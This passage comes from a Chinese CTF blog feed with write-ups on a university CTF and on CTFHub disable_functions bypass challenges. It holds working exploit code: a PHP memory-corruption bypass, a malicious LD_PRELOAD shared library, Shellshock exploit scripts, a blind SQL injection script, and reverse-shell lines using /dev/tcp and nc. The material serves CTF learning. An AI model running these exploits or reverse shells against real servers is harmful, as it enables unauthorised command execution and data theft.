class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是web目录没有上传权限…这时候发现web目录下存在<code>sandbox</code>文件夹，这里可以上传，nice！<br><img src="http://www.ggb0n.cool/images/gxctf12.png" alt=""></p><p>然后到浏览器访问<code>/sandbox/bypass7x.php</code>，但是一直不能访问…</p><p>但是我们有小马呢，用小马包含一下试试</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=include(<span class="string">"sandbox/bypass7x.php"</span>);</span></span><br></pre></td></tr></table></figure><p>发现成功执行：<br><img src="http://www.ggb0n.cool/images/gxctf08.png" alt=""></p><p>然后我们那执行的命令改为<code>/readflag</code>，即可拿到flag：<br><img src="http://www.ggb0n.cool/images/gxctf09.png" alt=""></p><p>这题的最后不得不说…搅屎真爽，不过有点可耻。</p><h1 id="DAY-2"><a href="#DAY-2" class="headerlink" title="DAY 2"></a>DAY 2</h1><p>剩下的题目都是高难度了，就出了半个题…</p><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><p>考察sql盲注+伪造mysql-server实现任意文件读取，这次是真心体会到，以后盲注脚本还是用ascii码吧，坚决不用字母表了…</p><h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>进入题目，发现可以注册登录，登陆上之后flag页面访问无权限，在评论区看到了如下的提示：<br><img src="http://www.ggb0n.cool/images/gxctf15.png" alt=""></p><p>猜测注册账户的时候可能存在问题，重新注册，抓包发现存在<code>type</code>参数，并且被置为<code>0</code>：<br><img src="http://www.ggb0n.cool/images/gxctf18.png" alt=""></p><p>那这个参数应该就是与等级有关了，后来在注册页面看到提示：<br><img src="http://www.ggb0n.cool/images/gxctf16.png" alt=""></p><p>再次抓包更改<code>type=110</code>，登录再次访问flag页，发现可以搜索flag了：<br><img src="http://www.ggb0n.cool/images/gxctf17.png" alt=""></p><p>搜索的页面是<code>search.php</code>，注入点肯定就是在这个页面了，参数是<code>flag</code>，经过FUZZ发现，<code>union</code>被ban，<code>select</code>、<code>from</code>需要双写绕过，查看搜索的回显发现，语句错误反馈<code>There is no flag</code>，语句正确反馈<code>There is flag!</code>肯定是盲注了，拿上次I春秋战“疫”赛的盲注脚本改了一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">headers = &#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=b2olm04l72i9v25s1orvb28253; username=8837cc3dd80b62a3b5bab3ff2dc91469"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = "-1' or (ascii(mid((selselectect database()),&#123;0&#125;,1))=&#123;1&#125;)#"</span></span><br><span class="line"><span class="comment">#payload = "-1' or (ascii(mid((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database()),&#123;0&#125;,1))=&#123;1&#125;)#"</span></span><br><span class="line"><span class="comment">#payload = "-1' or (ascii(mid((selselectect group_concat(column_name) frfromom information_schema.columns where table_name='admin'),&#123;0&#125;，1))=&#123;1&#125;)#"</span></span><br><span class="line">payload = <span class="string">"-1' or (ascii(mid((selselectect * frfromom fl4g),&#123;0&#125;,1))=&#123;1&#125;)#"</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">127</span>):<span class="comment">#注意这里有时候导致效率很低</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"flag"</span>: payload.format(i, n),</span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url, data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"There is flag"</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            database += chr(n)</span><br><span class="line">            print(database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>mysql不区分大小写，就是说如果a不存在，会用A去匹配a…写盲注脚本，如果用字母表的话，这就是个巨坑！还是用ascii码靠谱，不过ascii会匹配较多的字符，爆破速度有时候会很慢，可能因为很多字符请求让服务器500导致的…这一点跑脚本的时候改了半天…还是tcl</p></blockquote><p>跑出库名：<code>ctf-2</code><br>表名：<code>admin</code>、<code>fl4g</code>、<code>jd</code>、<code>user</code><br>直接到<code>fl4g</code>表跑flag，跑了几次都没有跑出完整的flag：<br><img src="http://www.ggb0n.cool/images/gxctf19.png" alt=""></p><p>后来经队友提示，flag可能是分开存放的，数据库可能只有部分flag。于是想到还有<code>admin</code>表可以去查管理员密码，用脚本跑出密码<code>e2ecea8b80a96fb07f43a2f83c8b0960</code>，md5解密一下得到<code>whoamiadmin</code>，拿去用<code>admin/whoamiadmin</code>登录却说用户名或密码错误…半天都不行…睡了睡了</p><p>DAY3醒来发现flag已经被队友交了，密码就是那个，应该是环境出问题了…那么再来学习一下。</p><p>管理员登录之后：<br><img src="http://www.ggb0n.cool/images/gxctf20.png" alt=""></p><p>根据前半部分flag，想到是<code>mysql蜜罐任意读取文件</code>参考<a href="https://www.jianshu.com/p/b97080cd7623">这里</a>，参考github上大师傅写的<a href="https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">脚本</a>，放在VPS上监听，然后在浏览器填入VPS地址和端口，利用构造的mysql蜜罐进行任意文件读取<code>flag.php</code>，就能拿到完整的flag了。</p><p>赛题环境没了，暂时没法复现了，知道原理，回头再试吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;20多所高校联合出题抗“疫”的比赛，排面也是可以的，来感受一下优秀高校的熏陶。🧐
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="布尔盲注" scheme="http://ggb0n.cool/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    
      <category term="反序列化漏洞" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
      <category term="万能密码绕过or过滤" scheme="http://ggb0n.cool/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87or%E8%BF%87%E6%BB%A4/"/>
    
      <category term="PHP session反序列化漏洞" scheme="http://ggb0n.cool/tags/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="bypass URL限制" scheme="http://ggb0n.cool/tags/bypass-URL%E9%99%90%E5%88%B6/"/>
    
      <category term="短命令执行" scheme="http://ggb0n.cool/tags/%E7%9F%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="Pyhton反序列化漏洞" scheme="http://ggb0n.cool/tags/Pyhton%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="pickle反序列化" scheme="http://ggb0n.cool/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="伪造mysql-server实现任意读取" scheme="http://ggb0n.cool/tags/%E4%BC%AA%E9%80%A0mysql-server%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-bypass_functions_disable</title>
    <link href="http://ggb0n.cool/2020/03/06/CTFHub-bypass-functions-disable/"/>
    <id>http://ggb0n.cool/2020/03/06/CTFHub-bypass-functions-disable/</id>
    <published>2020-03-06T05:54:14.000Z</published>
    <updated>2020-04-22T00:13:44.936Z</updated>
    
    <content type="html"><![CDATA[<p>不得不说，Line师傅们在技能树里安排的这个分支真是太棒了！作为一名菜鸡，之前只是对<code>bypass functions_disable</code>有比较少并且不清晰的理解，但是刷了这部分题相当于系统地学习了一遍，帮助很大！<a id="more"></a></p><p>现在的web题中<code>functions_disable</code>很常见，很多时候都会苦于小马上传、蚁剑连上之后不能读flag文件内容、终端也执行不了命令…这个时候就肯定是进行了<code>functions_disable</code>，需要我们尝试各种姿势来bypass了。</p><p>通过这篇博客，好好记录一下各种绕过姿势的学习。</p><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>主要考察利用Linux的环境变量<code>LD_PRELOAD</code>来进行<code>functions_disable</code>的bypass。</p><h3 id="关于利用LD-PRELOAD-bypass"><a href="#关于利用LD-PRELOAD-bypass" class="headerlink" title="关于利用LD_PRELOAD bypass"></a>关于利用LD_PRELOAD bypass</h3><blockquote><p>LD_PRELOAD是与载入函数库相关的环境变量,它的作用便是在程序运行前优先加载指定的函数库。</p><p>每个程序执行的时候会去动态链接库<code>so</code>文件里面找函数的位置，而我们的目的是让程序去执行我们自定义的动态链接库，这样就相当于在正常程序中进行<code>function_disable</code>禁用诸如<code>system</code>之前便执行了系统命令。</p></blockquote><p>结合上述两点，我们就可以自定义一个<code>so</code>文件上传，然后再用一个<code>php</code>的脚本来激活并达到反弹shell的目的。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>1、支持<code>putenv</code></li><li>2、支持<code>mail</code>、<code>imap_mail</code>、<code>mb_send_mail</code>或<code>error_log</code></li><li>3、存在可写的目录，需要上传<code>.so</code>文件</li></ul><h4 id="bypass流程"><a href="#bypass流程" class="headerlink" title="bypass流程"></a>bypass流程</h4><ul><li>1、在Linux下生成含有恶意代码的动态链接程序</li><li>2、通过php脚本利用<code>putenv</code>来设置<code>LD_PRELOAD</code>，使得优先调用我们构造的恶意动态链接程序</li><li>3、通过上述的php脚本触发恶意代码，以达到反弹shell的目的</li></ul><p>首先，构造的动态链接程序的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="keyword">void</span> Z2diMG4=()&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"cmd"</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        system(getenv(<span class="string">"cmd"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        system(<span class="string">"echo 'Hello' &gt; /hackfile"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>构造php触发脚本</strong>：</p><p>这里常用的有两种方式：<code>Sendmail+LD_PRELOAD</code>和<code>error_log+LD_PRELOAD</code>，如果服务端没有禁止<code>mail</code>的使用，就可以用前者，反之可以使用后者。</p><p><strong>Sendmail+LD_PRELOAD</strong>：sendmail会调用<code>geteuid()</code>，因此可以进行劫持，详细知识参考<a href="https://blog.csdn.net/xia739635297/article/details/104641082/">这里</a>。</p><p>触发脚本如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>so</code>文件传到<code>/tmp</code>文件夹是因为这个文件夹用户是可以进行写入的，自己也可以找别的文件夹来灵活构造。</p><p><strong>error_log+LD_PRELOAD</strong>：当题目环境不支持<code>mail</code>的时候，即可利用<code>error_log</code>来触发劫持，本题就需要用这种方法。</p><p>触发脚本如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    error_log(<span class="string">"a"</span>,<span class="number">1</span>);</span><br><span class="line">    mail(<span class="string">"a@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>另外当题目环境存在<code>gnupg拓展</code>的时候还可以利用php的<code>gnupg_init()</code>函数来触发，可以在<code>phpinfo</code>中看到，脚本如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    gnupg_init();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意上面脚本中执行的命令是将<code>ls</code>执行的结果重定向到<code>hackfile</code>中来查看，当然也可以通过如下的代码来拿到shell：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1'"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入题目，源码中给了部分源码：</p><p><img src="http://www.ggb0n.cool/images/ctfhub05.png" alt=""></p><p>源码中提示已经存在小马了，且秘钥是<code>ant</code>，直接拿到蚁剑里连接能连上，但是flag文件无法访问，开终端也无法执行命令：</p><p><img src="http://www.ggb0n.cool/images/ctfhub06.png" alt=""></p><p>肯定是system被ban了，需要进行<code>functions_disable</code>的bypass。</p><p>有两种方法：利用蚁剑自带的插件或者自己手工bypass</p><p><strong>利用蚁剑插件</strong></p><p>这个有要求：自己的环境必须是Linux的，因为它要用gcc去编译<code>so</code>文件。</p><p>这个要求满足之后便可以在<code>插件市场</code>中下载<code>functions_disable</code>bypass的插件，然后选择<code>LD_PRELOAD</code>进行bypass就行了。</p><p>这里有<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1">官方详解</a></p><p><strong>手动bypass</strong></p><p>首先利用前面提到的<code>C</code>代码，利用下面两条命令生成<code>so</code>文件：</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC ld_preload.c -o ld_preload</span><br><span class="line">gcc <span class="comment">--share ld_preload -o ld_preload.so</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ctfhub07.png" alt=""></p><p>同时用上述的代码构造好触发的php脚本：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//putenv("cmd=ls &gt; hackfile");</span></span><br><span class="line">    putenv(<span class="string">"cmd=/readflag &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/ld_preload.so"</span>);</span><br><span class="line">    error_log(<span class="string">"a"</span>,<span class="number">1</span>);</span><br><span class="line">    mail(<span class="string">"a@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把<code>so</code>文件上传到<code>/tmp/</code>文件夹下，触发脚本上传到<code>/var/www/html/</code>下</p><p>然后在浏览器访问我们写入的触发脚本，然后回到蚁剑查看效果：</p><p><img src="http://www.ggb0n.cool/images/ctfhub09.png" alt=""></p><p>可以看到<code>hackfile</code>文件已经存在了，打开即可拿到flag</p><p><img src="http://www.ggb0n.cool/images/ctfhub10.png" alt=""></p><p>关于这种bypass姿势，网上很多，以下几个写的全面一些：<br><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><br><a href="https://www.dazhuanlan.com/2020/01/06/5e128867c6c74/">https://www.dazhuanlan.com/2020/01/06/5e128867c6c74/</a></p><h2 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h2><p>主要考察利用bash破壳漏洞来执行命令，进行functions_disable的bypass</p><h3 id="关于利用ShellShock-bypass"><a href="#关于利用ShellShock-bypass" class="headerlink" title="关于利用ShellShock bypass"></a>关于利用ShellShock bypass</h3><blockquote><p>该姿势主要是借助了bash破壳（<a href="https://www.freebuf.com/news/48331.html">CVE-2014-6271</a>）漏洞，直接导致我们可以利用<code>mail()</code>函数执行任意命令，绕过disable_functions。</p></blockquote><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>1、支持<code>putenv</code></li><li>2、支持<code>mail</code>、<code>imap_mail</code>、<code>mb_send_mail</code>或<code>error_log</code></li><li>3、<code>/bin/bash</code> 存在 <code>CVE-2014-6271</code> 漏洞</li><li>4、<code>/bin/sh -&gt; /bin/bash</code> sh 默认的 shell 是 bash</li></ul><h4 id="bypass流程-1"><a href="#bypass流程-1" class="headerlink" title="bypass流程"></a>bypass流程</h4><ul><li>1、编写shellshock利用脚本并上传</li><li>2、浏览器访问上传的脚本进行反弹shell</li></ul><p>在网上找到了两版脚本代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//蚁剑提供的</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span></span>&#123;</span><br><span class="line">  $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">  <span class="keyword">if</span>(substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> &amp;&amp; function_exists(<span class="string">'putenv'</span>) &amp;&amp; (function_exists(<span class="string">'error_log'</span>) || function_exists(<span class="string">'mail'</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>)!=<span class="keyword">FALSE</span>)&#123;</span><br><span class="line">      $tmp=tempnam(sys_get_temp_dir(), <span class="string">'as'</span>);</span><br><span class="line">      putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">      <span class="keyword">if</span> (function_exists(<span class="string">'error_log'</span>)) &#123;</span><br><span class="line">        error_log(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        mail(<span class="string">"a@127.0.0.1"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"-bv"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Not vuln (not bash)\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $output = @file_get_contents($tmp);</span><br><span class="line">    @unlink($tmp);</span><br><span class="line">    <span class="keyword">if</span>($output!=<span class="string">""</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span>($output);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"No output, or not vuln."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"不满足使用条件"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runcmd("whoami"); // 要执行的命令</span></span><br><span class="line">runcmd($_REQUEST[<span class="string">"cmd"</span>]); <span class="comment">// ?cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以及下面这个：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>); </span><br><span class="line">   putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过蚁剑上传的web目录并访问，不出问题即可通过<code>cmd</code>传参执行命令。</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>进入题目还是那个页面：<br><img src="http://www.ggb0n.cool/images/ctfhub12.png" alt=""></p><p>上蚁剑，同样不能通过终端执行命令，查看一下phpinfo：<br><img src="http://www.ggb0n.cool/images/ctfhub13.png" alt=""></p><p>发现是<code>PHP5+</code>版本，因此可以利用<code>shellshock</code>进行bypass，两种方式：蚁剑插件 or 手工…</p><h4 id="利用蚁剑插件"><a href="#利用蚁剑插件" class="headerlink" title="利用蚁剑插件"></a>利用蚁剑插件</h4><p>参考<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2">这里</a>。</p><h4 id="手工bypass"><a href="#手工bypass" class="headerlink" title="手工bypass"></a>手工bypass</h4><p>利用上述代码构造exp脚本，上传并访问，即可拿到shell，通过控制cmd参数内容来进行命令执行。</p><p>话说，我做这题的时候这样用没成功…后来用l3m0n师傅的脚本打通的…</p><p>这里提一下l3m0n师傅脚本中的FUZZ脚本(就是那个名为<code>shell.php</code>的脚本)，上传这个脚本到web文件夹下，访问即可FUZZ出可以利用的点：<br><img src="http://www.ggb0n.cool/images/ctfhub16.png" alt=""></p><p>然后借助了<code>apache_mod_cgi</code>的解题方式最终拿到的flag。</p><p>可参考：<br><a href="https://www.secpulse.com/archives/2300.html">https://www.secpulse.com/archives/2300.html</a></p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>主要考察利用<code>apache mod_cgi</code>模块结合<code>.htaccess</code>对functions_disable进行bypass</p><h3 id="关于利用Apache-Mod-CGI-bypass"><a href="#关于利用Apache-Mod-CGI-bypass" class="headerlink" title="关于利用Apache_Mod_CGI bypass"></a>关于利用Apache_Mod_CGI bypass</h3><blockquote><p>在apache的WEB环境中，经常会使用<code>.htaccess</code>来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p></blockquote><h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>1、Linux 操作系统</li><li>2、Apache +PHP (apache 使用<code>apache_mod_php</code>)</li><li>3、Apache 开启了 <code>cgi</code>, <code>rewrite</code></li><li>4、Web 目录给了 <code>AllowOverride</code> 权限</li></ul><h4 id="bypass流程-2"><a href="#bypass流程-2" class="headerlink" title="bypass流程"></a>bypass流程</h4><ul><li>1、phpinfo查看服务端的配置是否支持<code>cgi</code></li><li>2、配置<code>.htaccess</code>文件并上传</li><li>3、上传反弹<code>shell</code>的文件</li></ul><p>配置.htaccess文件如下(参考蚁剑给出的策略)：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure><p>反弹<code>shell</code>文件代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">echo&amp;&amp;cd &quot;&#x2F;var&#x2F;www&#x2F;html&quot;;ls -al;echo [S];pwd;echo [E]</span><br><span class="line">&#x2F;&#x2F;注意是.ant后缀</span><br></pre></td></tr></table></figure><p>最后访问<code>shell.ant</code>即可进行反弹shell。</p><p>这里也参考了<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">l3m0n师傅github里关于bypass的脚本</a>，详细完备，学到很多。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c '/bin/bash' 172.16.15.1 4444"</span>; <span class="comment">//command to be executed</span></span><br><span class="line">$shellfile = <span class="string">"#!/bin/bash\n"</span>; <span class="comment">//using a shellscript</span></span><br><span class="line">$shellfile .= <span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line">$shellfile .= <span class="string">"$cmd"</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span><span class="params">($text, $condition, $yes, $no)</span> //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span 